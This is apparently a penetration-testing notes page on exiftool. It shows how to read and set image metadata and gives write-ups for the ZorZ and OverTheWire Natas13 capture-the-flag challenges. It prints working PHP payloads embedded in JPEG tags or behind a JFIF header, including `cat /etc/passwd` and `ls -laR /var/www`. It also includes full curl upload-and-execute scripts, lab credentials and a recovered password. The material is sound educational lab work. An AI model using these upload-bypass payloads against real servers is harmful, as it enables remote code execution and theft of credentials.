@@ -1,0 +1,480 @@
+.. include:: /pentest_links.txt
+
+
+*******************
+:program:`exiftool`
+*******************
+
+:program:`exiftool`
+===================
+
+The tool
+--------
+
+From `Wikipedia ExifTool <http://en.wikipedia.org/wiki/ExifTool>`_:
+
+  ExifTool is a free software program for reading, writing, and manipulating image, audio, and video metadata. ...  ExifTool is commonly incorporated into different types of digital workflows and supports many types of metadata including Exif, IPTC, XMP, JFIF, GeoTIFF, ICC Profile, Photoshop IRB, FlashPix, AFCP and ID3, as well as the manufacturer-specific metadata formats of many digital cameras. ... The image hosting site Flickr uses ExifTool to parse the metadata from uploaded images.
+
+The official website is `ExifTool by Phil Harvey <http://owl.phy.queensu.ca/~phil/exiftool/>`_ lists the `Supported File Types <http://owl.phy.queensu.ca/~phil/exiftool/#supported>`_ and the `Supported JPEG Meta Information <http://owl.phy.queensu.ca/~phil/exiftool/#JPEG>`_.
+
+In Debian-based distributions it's part of the libimage-exiftool-perl package:
+
+.. code-block:: bash
+  :emphasize-lines: 5
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  $SUDO apt-get install apt-file -y
+  $SUDO apt-file update
+  apt-file find bin/exiftool
+
+
+.. code-block:: console
+  :emphasize-lines: 7-8
+
+  hacker@kali:~$ SUDO=$(which sudo)
+  hacker@kali:~$ [[ "$USER" == "root" ]] && SUDO=
+  hacker@kali:~$ $SUDO apt-get install apt-file -y
+  ###################### SNIP ######################
+  hacker@kali:~$ $SUDO apt-file update
+  ###################### SNIP ######################
+  hacker@kali:~$ apt-file find bin/exiftool
+  libimage-exiftool-perl: /usr/bin/exiftool
+
+File metadata and tags
+----------------------
+
+From `Tag Names Explained <http://owl.phy.queensu.ca/~phil/exiftool/#tagnamesf>`_:
+
+  A tag name is a "handle" that is used to refer to a specific piece of meta information. Tag names are entered on the command line with a leading '-', in the order you want them displayed. Case is not significant. The tag name may be prefixed by a group name from family 0 or 1 (separated by a colon) to identify a specific information type or location. A special tag name of "All" may be used to represent all tags, or all tags in a specified group. For example:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  JPEG=trick.php.jpeg
+  curl --silent --output $JPEG http://www.exiv2.org/include/img_1771.jpg
+  exiftool -filename -imagesize -exif:fnumber -xmp:all $JPEG
+
+.. code-block:: console
+  :emphasize-lines: 3-6
+
+  hacker@kali:~$ JPEG=trick.php.jpeg
+  hacker@kali:~$ curl --silent --output $JPEG http://www.exiv2.org/include/img_1771.jpg
+  hacker@kali:~$ exiftool -filename -imagesize -exif:fnumber -xmp:all $JPEG
+  File Name                       : trick.php.jpeg
+  Image Size                      : 480x360
+  F Number                        : 4.9
+
+
+The complete list of recognized tags can be found at `ExifTool Tag Names <http://owl.phy.queensu.ca/~phil/exiftool/TagNames/index.html>`_. For our sample image the list of all tags can be gotten from:
+
+.. code-block:: bash
+  :emphasize-lines: 1
+
+  exiftool -all $JPEG
+
+.. code-block:: console
+  :emphasize-lines: 1
+
+  hacker@kali:~$ exiftool -all $JPEG
+  ExifTool Version Number         : 8.60
+  File Name                       : trick.php.jpeg
+  Directory                       : .
+  File Size                       : 32 kB
+  File Modification Date/Time     : 2015:05:06 11:03:46-07:00
+  File Permissions                : rw-r--r--
+  File Type                       : JPEG
+  MIME Type                       : image/jpeg
+  JFIF Version                    : 1.01
+  Exif Byte Order                 : Little-endian (Intel, II)
+  Make                            : Canon
+  Camera Model Name               : Canon PowerShot S40
+  Orientation                     : Horizontal (normal)
+  X Resolution                    : 180
+  Y Resolution                    : 180
+  Resolution Unit                 : inches
+  Modify Date                     : 2003:12:14 12:01:44
+  Y Cb Cr Positioning             : Centered
+  Exposure Time                   : 1/500
+  F Number                        : 4.9
+  Exif Version                    : 0220
+  Date/Time Original              : 2003:12:14 12:01:44
+  Create Date                     : 2003:12:14 12:01:44
+  Components Configuration        : Y, Cb, Cr, -
+  Compressed Bits Per Pixel       : 5
+  Shutter Speed Value             : 1/501
+  Aperture Value                  : 5.0
+  Max Aperture Value              : 2.8
+  Flash                           : Auto, Did not fire
+  Focal Length                    : 21.3 mm
+  Macro Mode                      : Normal
+  Self Timer                      : Off
+  Quality                         : Superfine
+  Canon Flash Mode                : Auto
+  Continuous Drive                : Single
+  Focus Mode                      : Single
+  Record Mode                     : JPEG
+  Canon Image Size                : Large
+  Easy Mode                       : Manual
+  Digital Zoom                    : None
+  Contrast                        : Normal
+  Saturation                      : Normal
+  Sharpness                       : 0
+  Camera ISO                      : 100
+  Metering Mode                   : Center-weighted average
+  Focus Range                     : Auto
+  AF Point                        : Center
+  Canon Exposure Mode             : Program AE
+  Lens Type                       : Unknown (-1)
+  Long Focal                      : 21.3125 mm
+  Short Focal                     : 7.09375 mm
+  Focal Units                     : 32/mm
+  Max Aperture                    : 5
+  Min Aperture                    : 8
+  Flash Activity                  : 0
+  Flash Bits                      : (none)
+  Focus Continuous                : Single
+  AE Setting                      : Normal AE
+  Display Aperture                : 4.9
+  Zoom Source Width               : 2272
+  Zoom Target Width               : 2272
+  Spot Metering Mode              : AF Point
+  Focal Type                      : Zoom
+  Focal Plane X Size              : 7.26 mm
+  Focal Plane Y Size              : 5.46 mm
+  Auto ISO                        : 100
+  Base ISO                        : 100
+  Measured EV                     : 13.62
+  Target Aperture                 : 5
+  Target Exposure Time            : 1/501
+  Exposure Compensation           : 0
+  White Balance                   : Auto
+  Slow Shutter                    : Off
+  Shot Number In Continuous Burst : 0
+  Optical Zoom Code               : 6
+  Flash Guide Number              : 0
+  AF Points In Focus              : Center
+  Flash Exposure Compensation     : 0
+  Auto Exposure Bracketing        : Off
+  AEB Bracket Value               : 0
+  Control Mode                    : Camera Local Control
+  Focus Distance Upper            : 7.82 m
+  Focus Distance Lower            : 0 m
+  Bulb Duration                   : 0
+  Camera Type                     : Compact
+  Canon Image Type                : IMG:PowerShot S40 JPEG
+  Canon Firmware Version          : Firmware Version 1.10
+  File Number                     : 117-1771
+  Owner Name                      : Andreas Huggel
+  Canon Model ID                  : PowerShot S40
+  User Comment                    : 
+  Flashpix Version                : 0100
+  Color Space                     : sRGB
+  Exif Image Width                : 2272
+  Exif Image Height               : 1704
+  Interoperability Index          : R98 - DCF basic file (sRGB)
+  Interoperability Version        : 0100
+  Related Image Width             : 2272
+  Related Image Height            : 1704
+  Focal Plane X Resolution        : 8114.285714
+  Focal Plane Y Resolution        : 8114.285714
+  Focal Plane Resolution Unit     : inches
+  Sensing Method                  : One-chip color area
+  File Source                     : Digital Camera
+  Custom Rendered                 : Normal
+  Exposure Mode                   : Auto
+  Digital Zoom Ratio              : 1
+  Scene Capture Type              : Standard
+  Compression                     : JPEG (old-style)
+  Thumbnail Offset                : 2066
+  Thumbnail Length                : 5448
+  Image Width                     : 480
+  Image Height                    : 360
+  Encoding Process                : Baseline DCT, Huffman coding
+  Bits Per Sample                 : 8
+  Color Components                : 3
+  Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+  Aperture                        : 4.9
+  Drive Mode                      : Single-frame Shooting
+  ISO                             : 100
+  Image Size                      : 480x360
+  Lens                            : 7.1 - 21.3 mm
+  Lens ID                         : Unknown 7-21mm
+  Scale Factor To 35 mm Equivalent: 4.8
+  Shooting Mode                   : Program AE
+  Shutter Speed                   : 1/500
+  Thumbnail Image                 : (Binary data 5448 bytes, use -b option to extract)
+  Circle Of Confusion             : 0.006 mm
+  Field Of View                   : 20.1 deg
+  Focal Length                    : 21.3 mm (35 mm equivalent: 101.5 mm)
+  Hyperfocal Distance             : 14.69 m
+  Lens                            : 7.1 - 21.3 mm (35 mm equivalent: 33.8 - 101.5 mm)
+  Light Value                     : 13.6
+
+Manipulating tags
+-----------------
+
+Notice that tag "DocumentName" is not in $JPEG but we can set it to a php script:
+
+.. code-block:: bash
+  :emphasize-lines: 2,4-5,7
+
+  # no DocumentName tag
+  exiftool -DocumentName $JPEG
+  # now set DocumentName tag
+  exiftool -DocumentName='<?php passthru("ls -laR /var/www"); ?>' $JPEG
+  exiftool -DocumentName $JPEG
+  # original copy saved
+  ls ${JPEG}*
+
+.. code-block:: console
+  :emphasize-lines: 2,4,6-7,9-10
+
+  hacker@kali:~$ # no DocumentName tag
+  hacker@kali:~$ exiftool -DocumentName $JPEG
+  hacker@kali:~$ # now set DocumentName tag
+  hacker@kali:~$ exiftool -DocumentName='<?php passthru("ls -laR /var/www"); ?>' $JPEG
+      1 image files updated
+  hacker@kali:~$ exiftool -DocumentName $JPEG
+  Document Name                   : <?php passthru("ls -laR /var/www"); ?>
+  hacker@kali:~$ # original copy saved
+  hacker@kali:~$ ls ${JPEG}*
+  trick.php.jpeg  trick.php.jpeg_original
+
+Where in the $JPEG file can we find the tag DocumentName? Here's a few looks at it showing it's near the beginning of the file:
+
+.. code-block:: bash
+  :emphasize-lines: 1-2
+
+  strings $JPEG | sed -e '/Canon/q'
+  od -c $JPEG | sed -e '/C   a   n/q'
+
+
+.. code-block:: console
+  :emphasize-lines: 1-6,17-19
+
+  hacker@kali:~$ strings $JPEG | sed -e '/Canon/q'
+  JFIF
+  Exif
+  <?php passthru("ls -laR /var/www"); ?>
+  Canon
+  hacker@kali:~$ od -c $JPEG | sed -e '/C   a   n/q'
+  0000000 377 330 377 340  \0 020   J   F   I   F  \0 001 001 001  \0   H
+  0000020  \0   H  \0  \0 377 341 033 234   E   x   i   f  \0  \0   I   I
+  0000040   *  \0  \b  \0  \0  \0  \n  \0  \r 001 002  \0   '  \0  \0  \0
+  0000060 206  \0  \0  \0 017 001 002  \0 006  \0  \0  \0 256  \0  \0  \0
+  0000100 020 001 002  \0 024  \0  \0  \0 264  \0  \0  \0 022 001 003  \0
+  0000120 001  \0  \0  \0 001  \0  \0  \0 032 001 005  \0 001  \0  \0  \0
+  0000140 310  \0  \0  \0 033 001 005  \0 001  \0  \0  \0 320  \0  \0  \0
+  0000160   ( 001 003  \0 001  \0  \0  \0 002  \0  \0  \0   2 001 002  \0
+  0000200 024  \0  \0  \0 330  \0  \0  \0 023 002 003  \0 001  \0  \0  \0
+  0000220 001  \0  \0  \0   i 207 004  \0 001  \0  \0  \0 354  \0  \0  \0
+  0000240 356 005  \0  \0   <   ?   p   h   p       p   a   s   s   t   h
+  0000260   r   u   (   "   l   s       -   l   a   R       /   v   a   r
+  0000300   /   w   w   w   "   )   ;       ?   >  \0  \0   C   a   n   o
+
+The JFIF (`JPEG File Interchange Format <http://www.w3.org/Graphics/JPEG/jfif3.pdf>`_) clearly states:
+
+  you can identify a JFIF file by looking for the following sequence: X'FF', SOI, X'FF', APP0, <2 bytes to be skipped>, "JFIF", X'00'
+
+Following this recipe:
+
+.. code-block:: bash
+  :emphasize-lines: 1-4
+
+  # JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + "JFIF" + \x00
+  JFIF_HEADER="\xFF\xD8\xFF\xE0\x00\x10JFIF\x00"
+  EXPLOIT='<?php passthru("cat /etc/passwd"); ?>'
+  echo -e "$JFIF_HEADER$EXPLOIT" > exploit.php.jpeg
+
+
+
+Exploiting metadata
+===================
+
+Idea behind the exploits
+------------------------
+
+Exploits can be based on a web server knowingly extracting metadata and trying to display the information. Consult `Finding Zero-Day XSS Vulns via Doc Metadata <http://pen-testing.sans.org/blog/2014/12/04/cross-site-scripting-through-file-metedata>`_ for some examples of this. The idea is to set multiple tag fields to JavaScript exploits (perhaps the `BeEF`_ hook) and uploading it to vulnerable web sites.
+
+Another approach is to upload a file :file:`x.php.jpeg` with tag-based php scripts to a php-based site that only allows image files. Accessing :file:`x.php.jpeg` then causes the tag-based php to execute.
+
+ZorZ - a challenge using tags
+-----------------------------
+
+ZorZ involved 3 web pages allowing image file uploads. The first & third were easy: just name a php exploit file :file:`x.php.jpeg` and the uploader saw the ".jpeg" extension and allowed it, while php saw the "x.php" and executed the file as a php script.
+
+However the second upload page really seemed to want an image file. So we used :program:`exiftool` to add a DocumentName tag that was actually a php exploit script. Here goes the exploit code:
+
+.. code-block:: bash
+
+  # need ZorZ VM IP here
+  IP=192.168.1.100
+  JPEG=trick.php.jpeg
+  curl --silent --output $JPEG  http://www.exiv2.org/include/img_1771.jpg
+  exiftool -DocumentName='<?php passthru("ls -laR /var/www"); ?>' $JPEG
+  curl --silent \
+       --form upfile="@$JPEG" \
+       --form submit="Upload Image" \
+       http://$IP/uploader2.php \
+    | grep 'Success!'
+  curl --silent http://$IP/uploads2/$JPEG 2>&1 | strings | sed /^Canon/q
+
+Running it allowed us to run our directory listing which revealed the SECRETFILE:
+
+.. code-block:: console
+  :emphasize-lines: 3-5,7-11,13,48
+
+  hacker@kali:~$ # need ZorZ VM IP here
+  hacker@kali:~$ IP=192.168.1.100
+  hacker@kali:~$ JPEG=trick.php.jpeg
+  hacker@kali:~$ curl --silent --output $JPEG  http://www.exiv2.org/include/img_1771.jpg
+  hacker@kali:~$ exiftool -DocumentName='<?php passthru("ls -laR /var/www"); ?>' $JPEG
+      1 image files updated
+  hacker@kali:~$ curl --silent \
+  >      --form upfile="@$JPEG" \
+  >      --form submit="Upload Image" \
+  >      http://$IP/uploader2.php \
+  >   | grep 'Success!'
+   Success! image/jpeg.The file trick.php.jpeg has been uploaded. 
+  hacker@kali:~$ curl --silent http://$IP/uploads2/$JPEG 2>&1 | strings | sed /^Canon/q
+  JFIF
+  Exif
+  /var/www:
+  total 12
+  drwxr-xr-x  3 root root 4096 Feb 17 20:44 .
+  drwxr-xr-x 12 root root 4096 Feb 17 20:44 ..
+  drwxr-xr-x  7 root root 4096 Feb 18 22:40 html
+  /var/www/html:
+  total 48
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .
+  drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..
+  -rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html
+  -rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html
+  drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery
+  drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337
+  -rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php
+  -rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php
+  -rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php
+  drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 uploads1
+  drwxr-xr-x 2 www-data www-data 4096 Apr 21 19:05 uploads2
+  drwxr-xr-x 2 www-data root     4096 Feb 18 22:39 uploads3
+  /var/www/html/jQuery:
+  total 28
+  drwxr-xr-x 2 root root 4096 Feb 18 22:22 .
+  drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 root root  753 Aug  7  2009 delete.png
+  -rw-r--r-- 1 root root  715 Feb 18 21:59 script.js
+  -rw-r--r-- 1 root root 1714 Feb 18 22:00 style.css
+  -rw-r--r-- 1 root root 1049 Feb 18 22:18 upload.php
+  -rw-r--r-- 1 root root 1232 Feb 18 22:19 uploadphp.php
+  /var/www/html/l337saucel337:
+  total 12
+  drwxr-xr-x 2 root root 4096 Feb 18 22:45 .
+  drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE
+  /var/www/html/uploads1:
+  total 12
+  drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 .
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 www-data www-data   40 Apr 21 16:58 command.php.jpeg
+  /var/www/html/uploads2:
+  total 192
+  drwxr-xr-x 2 www-data www-data  4096 Apr 21 19:05 .
+  drwxr-xr-x 7 root     root      4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 www-data www-data 32764 Apr 21 17:22 command.php.jpeg
+  -rw-r--r-- 1 www-data www-data 10040 Apr 21 17:27 command10000.php.jpeg
+  -rw-r--r-- 1 www-data www-data 10000 Apr 21 17:26 command10000.php.jpg
+  -rw-r--r-- 1 www-data www-data 32154 Apr 21 18:45 fake.php.jpeg
+  -rw-r--r-- 1 www-data www-data 32764 Apr 21 17:17 img_1771.jpg
+  -rw-r--r-- 1 www-data www-data 32154 Apr 21 19:05 trick.php.jpeg
+  -rw-r--r-- 1 www-data www-data 32154 Apr 21 18:39 x.php.jpeg
+  /var/www/html/uploads3:
+  total 8
+  drwxr-xr-x 2 www-data root 4096 Feb 18 22:39 .
+  drwxr-xr-x 7 root     root 4096 Feb 18 22:40 ..
+  Canon
+
+To complete the challenge we just needed to fetch SECRETFILE:
+
+.. code-block:: console
+
+  hacker@kali:~$ curl --silent --remote-name http://$IP/l337saucel337/SECRETFILE
+  hacker@kali:~$ cat SECRETFILE
+  Great job so far. This box has 3 uploaders.
+
+  The first 2 are pure php, the last one is php w/jquery.
+
+  To get credit for this challenge, please submit a write-up or instructions
+  on how you compromised the uploader or uploaders. If you solve 1, 2, or all
+  of the uploader challenges, feel free to shoot me an email and let me know!
+
+  admin@top-hat-sec.com
+
+  Thanks for playing!
+  http://www.top-hat-sec.com
+
+
+
+
+Natas13 - only first 11 bytes are JPEG
+--------------------------------------
+
+But that trick doesn't always work easily. Natas13 disallows images larger than 1000 bytes which can take some work to create. A simpler alternative in this case was to create a php file consisting of the first 11 bytes identifying JPEG JFIF files, with our exploit php script appended after that. Here are the details.
+
+The challenge `OverTheWire Natas <http://overthewire.org/wargames/natas/>`_ teaches the basics of serverside web security. `Natas Level 13 -> 14 <http://natas13.natas.labs.overthewire.org/>`_ (user id nata13, password "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY") is backed by a server-side script using ``exif_imagetype`` check to make sure the uploaded file is an image file. Here we use several techniques to pass the image check while still uploading php to display the contents of the file :file:`/etc/natas_webpass/natas14` (password for the next Natas level).
+
+The php exploit code is:
+
+.. code-block:: bash
+  :emphasize-lines: 1-5
+
+  # JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + "JFIF" + \x00
+  JFIF_HEADER="\xFF\xD8\xFF\xE0\x00\x10JFIF\x00"
+  EXPLOIT='<?php passthru("echo -n PASS; cat /etc/natas_webpass/natas14"); ?>'
+  echo -e "$JFIF_HEADER$EXPLOIT" > natas14.php
+  # upload to web server and capture saved filename
+  upload=$( \
+    curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+      --form filename=natas14.php \
+      --form uploadedfile=@natas14.php \
+      --form submit="Upload File" \
+      http://natas13.natas.labs.overthewire.org/index.php \
+    | grep 'a href="upload/' \
+  )
+  file=${upload#*upload/}
+  file=${file%%\"*}
+  curl --silent \
+       --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+       http://natas13.natas.labs.overthewire.org/upload/$file |
+  tail -n1 | tr -cd '[:print:]'  | sed -e 's/^.*PASS//;s/$/\
+  /'
+
+Running this gives the Natas 14 password:
+
+.. code-block:: console
+  :emphasize-lines: 1-5,21
+
+  hacker@kali:~$ # JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + "JFIF" + \x00
+  hacker@kali:~$ JFIF_HEADER="\xFF\xD8\xFF\xE0\x00\x10JFIF\x00"
+  hacker@kali:~$ EXPLOIT='<?php passthru("echo -n PASS; cat /etc/natas_webpass/natas14"); ?>'
+  hacker@kali:~$ echo -e "$JFIF_HEADER$EXPLOIT" > natas14.php
+  hacker@kali:~$ # upload to web server and capture saved filename
+  hacker@kali:~$ upload=$( \
+  >   curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+  >     --form filename=natas14.php \
+  >     --form uploadedfile=@natas14.php \
+  >     --form submit="Upload File" \
+  >     http://natas13.natas.labs.overthewire.org/index.php \
+  >   | grep 'a href="upload/' \
+  > )
+  hacker@kali:~$ file=${upload#*upload/}
+  hacker@kali:~$ file=${file%%\"*}
+  hacker@kali:~$ curl --silent \
+  >      --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY \
+  >      http://natas13.natas.labs.overthewire.org/upload/$file |
+  > tail -n1 | tr -cd '[:print:]'  | sed -e 's/^.*PASS//;s/$/\
+  > /'
+  Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+
